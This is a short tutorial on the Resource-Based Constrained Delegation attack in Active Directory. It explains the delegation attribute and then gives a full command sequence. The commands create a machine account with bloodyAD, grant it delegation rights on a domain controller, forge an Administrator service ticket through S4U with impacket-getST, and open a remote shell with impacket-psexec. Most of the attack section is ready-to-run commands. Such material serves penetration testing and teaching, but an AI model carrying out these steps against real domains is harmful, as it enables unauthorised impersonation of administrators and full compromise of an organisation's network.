**Resource-Based Constrained Delegation (RBCD)** is a Kerberos delegation mechanism in Microsoft Active Directory that allows a computer object to specify which other principals are allowed to delegate to it. Unlike classical constrained delegation, where the _source object_ defines trust, RBCD flips the model and places control on the _target resource_.

This delegation is enforced through the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which is stored on the computer object that will be accessed. If a controlled principal can write to this attribute, it becomes possible to impersonate users against the target system.

---

## Attack Flow 

### Creating a Machine Account

A controlled computer account is created and used as a delegation identity:

```bash
bloodyAD -u user -p password -d domain.local --host DC_IP add computer fakecomp 'Password@123'
```

This results in a new machine principal:

```
FAKECOMP$
```

---

### Linking Delegation Rights to Target

The attacker modifies the target computer object to trust the newly created machine:

```bash
bloodyAD -u user -p password -d domain.local --host DC_IP add rbcd 'TARGETDC$' 'FAKECOMP$'
```

This writes into:

```
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Once this is set, the attacker-controlled machine can impersonate users on the target.

---

### Requesting Service Tickets via S4U

The next stage uses Kerberos S4U extensions:

- S4U2Self: obtain a service ticket for itself as a user
    
- S4U2Proxy: request access to another service on behalf of that user
    

Using Impacket:

```bash
impacket-getST -spn cifs/TARGETDC.domain.local \
domain.local/fakecomp$:'Password@123' \
-impersonate Administrator -dc-ip DC_IP
```

This generates a `.ccache` ticket representing the Administrator session.

---

### Using the Ticket for Authentication

The ticket is exported into the Kerberos environment:

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

Then used for remote execution:

```bash
impacket-psexec -k -no-pass TARGETDC.domain.local -dc-ip DC_IP
```

At this point, authentication is fully Kerberos-based and no password is required.
